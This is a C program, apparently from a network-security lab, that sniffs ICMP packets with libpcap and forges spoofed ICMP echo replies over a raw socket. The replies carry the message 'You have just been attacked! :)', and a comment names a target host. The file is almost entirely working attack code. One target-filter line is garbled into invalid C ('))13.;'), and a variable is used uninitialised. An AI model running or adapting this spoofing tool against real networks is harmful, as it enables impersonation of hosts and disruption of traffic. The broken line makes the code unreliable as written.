# include <pcap.h>
# include <stdio.h>
# include <arpa/inet.h>
# include <string.h>
# include <unistd.h>
# include <sys/socket.h>
# include <netinet/in.h>
# include <netinet/ip.h>
# include <netinet/ip_icmp.h>
# include <errno.h>

# define IP4_HDRLEN 20
# define ICMP_HDRLEN 8

unsigned short calculate_checksum(unsigned short *paddress, int len);
/*Ethernet header*/

struct ethheader {
    u_char ether_dhost[6];//destination hostaddress 
    u_char ether_shost[6];//source hostaddress 
    u_short ether_type; //protocol type(IP, ARP, RARP, etc)
};

/*IP Header*/
struct ipheader {
    unsigned char iph_ihl: 4, // IP header length  
    iph_ver: 4; // IP version  
    unsigned char iph_tos; // Type of service  
    unsigned short int iph_len; // IP Packet length(data + header)  
    unsigned short int iph_ident; // Identification  
    unsigned short int iph_flag: 3, // Fragmentation flags  
    iph_offset: 13; // Flags offset  
    unsigned char iph_ttl; // Time to Live  
    unsigned char iph_protocol; // Protocol type  
    unsigned short int iph_chksum; // IP datagram checksum  
    struct in_addr iph_sourceip; // Source IP address  
    struct in_addr iph_destip; // Destination IP address  
};

void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet) {
    struct ethheader *eth = (struct ethheader *) packet;
    if (ntohs(eth->ether_type) == 0x0800) { // 0x0800 is IP type
        struct ipheader *ip = (struct ipheader *)
                (packet + sizeof(struct ethheader));
        if (ip->iph_protocol == IPPROTO_ICMP) {
            printf("   Protocol: ICMP\n");
            printf("       From: %s\n", inet_ntoa(ip->iph_sourceip));
            printf("         To: %s\n", inet_ntoa(ip->iph_destip));

            // spoofing specific target  

            if (!strcmp(inet_ntoa(ip->iph_sourceip), "10.0.2.5"))13.;
            struct ip iphdr; // IPv4 header  
            struct icmp icmphdr; // ICMP-header  
            char data[IP_MAXPACKET] = "You have just been attacked! :)";

            int datalen = strlen(data) + 1;
            iphdr.ip_v = 4;
            iphdr.ip_hl = IP4_HDRLEN / 4;
            iphdr.ip_tos = 0;
            iphdr.ip_len = htons(IP4_HDRLEN + ICMP_HDRLEN + datalen);
            iphdr.ip_id = 0;
            int ip_flags[4];
            ip_flags[0] = 0;
            ip_flags[1] = 0;
            ip_flags[2] = 0;
            ip_flags[3] = 0;

            iphdr.ip_off = htons((ip_flags[0] << 15) + (ip_flags[1] << 14) +
                                 (ip_flags[2] << 13) + ip_flags[3]);
            iphdr.ip_ttl = 128;
            iphdr.ip_p = IPPROTO_ICMP;
            if (inet_pton(AF_INET, inet_ntoa(ip->iph_destip),&(iphdr.ip_src)) <= 0) {
                fprintf(stderr, "inet_pton() failed for source-ip with error: %d",errno);
                return;
            }

            if (inet_pton(AF_INET, inet_ntoa(ip->iph_sourceip),&(iphdr.ip_dst)) <= 0) {
                fprintf(stderr, "inet_pton() failed for destination-ip with error: %d", errno);
                return;
            }

            iphdr.ip_sum = 0;
            iphdr.ip_sum = calculate_checksum((unsigned short *) &iphdr,IP4_HDRLEN);
            icmphdr.icmp_type = ICMP_ECHOREPLY;
            icmphdr.icmp_code = 0;
            icmphdr.icmp_id = 18;
            icmphdr.icmp_seq = 0;
            icmphdr.icmp_cksum = 0;

            char packet[IP_MAXPACKET];
            memcpy(packet, &iphdr, IP4_HDRLEN);
            memcpy((packet + IP4_HDRLEN), &icmphdr, ICMP_HDRLEN);
            memcpy(packet + IP4_HDRLEN + ICMP_HDRLEN, data, datalen);

            icmphdr.icmp_cksum= calculate_checksum((unsigned short *)(packet + IP4_HDRLEN), ICMP_HDRLEN + datalen);
            memcpy((packet + IP4_HDRLEN), &icmphdr, ICMP_HDRLEN);

            struct sockaddr_in dest_in;
            memset(&dest_in, 0, sizeof(struct sockaddr_in));
            dest_in.sin_family = AF_INET;
            dest_in.sin_addr.s_addr = iphdr.ip_dst.s_addr;
            int sock = -1;
            if ((sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) == -1) {
                fprintf(stderr, "socket() failed with error: %d", errno);
                fprintf(stderr, "To create a raw socket, the process needs to be run by Ad	min/root user.\n\n");
                return;
            }

            const int flagOne = 1;
            if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &flagOne, sizeof(flagOne)) == -1) {
                fprintf(stderr, "setsockopt() failed with error: %d", errno);
                return;
            }
            if (sendto(sock, packet, IP4_HDRLEN + ICMP_HDRLEN + datalen, 0,
                       (struct sockaddr *) &dest_in, sizeof(dest_in)) == -1) {
                fprintf(stderr, "sendto() failed with error: %d", errno);
                return;
            }
            close(sock);
        }
    }
}


int main() {
    pcap_t *handle;
    char errbuf[PCAP_ERRBUF_SIZE];
    struct bpf_program fp;
    char filter_exp[] = "ip proto icmp";
    bpf_u_int32 net;

    // Step 1: Open live pcap session on NIC with name enp0s3  
    handle = pcap_open_live("enp0s3", BUFSIZ, 1, 1000, errbuf);

    // Step 2: Compile filter_exp into BPF psuedo - code  
    pcap_compile(handle, &fp, filter_exp, 0, net);
    pcap_setfilter(handle, &fp);

    // Step 3: Capture packets  
    pcap_loop(handle, -1, got_packet, NULL);

    pcap_close(handle); // Close the handle  
    return 0;
}

// checksum unsigned short  
unsigned short calculate_checksum(unsigned short *paddress, int len) {
    int nleft = len;
    int sum = 0;
    unsigned short *w = paddress;
    unsigned short answer = 0;

    while (nleft > 1) {
        sum += *w++;
        nleft -= 2;
    }
    if (nleft == 1) {
        *((unsigned char *) &answer) = *((unsigned char *) w);
        sum += answer;
    }
    // add back carry outs from top 16 bits to low 16 bits  
    sum = (sum >> 16) + (sum & 0xffff); // add hi 16 to low 16  
    sum += (sum >> 16); // add carry  
    answer = ~sum; // truncate to 16 bits  
    return answer;
}